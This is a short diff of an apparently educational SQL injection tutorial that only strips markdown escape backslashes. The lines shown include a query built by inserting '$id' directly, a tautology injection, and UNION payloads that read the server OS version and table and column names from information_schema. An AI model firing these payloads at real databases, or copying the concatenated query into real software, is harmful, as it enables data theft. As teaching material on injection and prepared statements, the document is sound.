@@ -244,11 +244,11 @@ SQL Injection
 
 ```sql
 
-SELECT first\_name, last\_name
+SELECT first_name, last_name
 
 FROM users
 
-WHERE user\_id = '$id';
+WHERE user_id = '$id';
 
 ```
 
@@ -272,11 +272,11 @@ WHERE user\_id = '$id';
 
 ```sql
 
-SELECT first\_name, last\_name
+SELECT first_name, last_name
 
 FROM users
 
-WHERE user\_id = '1' OR '1'='1';
+WHERE user_id = '1' OR '1'='1';
 
 ```
 
@@ -616,7 +616,7 @@ Payload：
 
 ```sql
 
-1' UNION SELECT @@version\_compile\_os,2#
+1' UNION SELECT @@version_compile_os,2#
 
 ```
 
@@ -644,7 +644,7 @@ Payload：
 
 ```sql
 
-1' UNION SELECT table\_name,2 FROM information\_schema.tables#
+1' UNION SELECT table_name,2 FROM information_schema.tables#
 
 ```
 
@@ -668,7 +668,7 @@ Payload：
 
 ```sql
 
-1' UNION SELECT column\_name,2 FROM information\_schema.columns#
+1' UNION SELECT column_name,2 FROM information_schema.columns#
 
 ```
 
@@ -804,9 +804,9 @@ Prepared Statement
 
 "
 
-\#
+#
 
-\--
+--
 
 ;
 
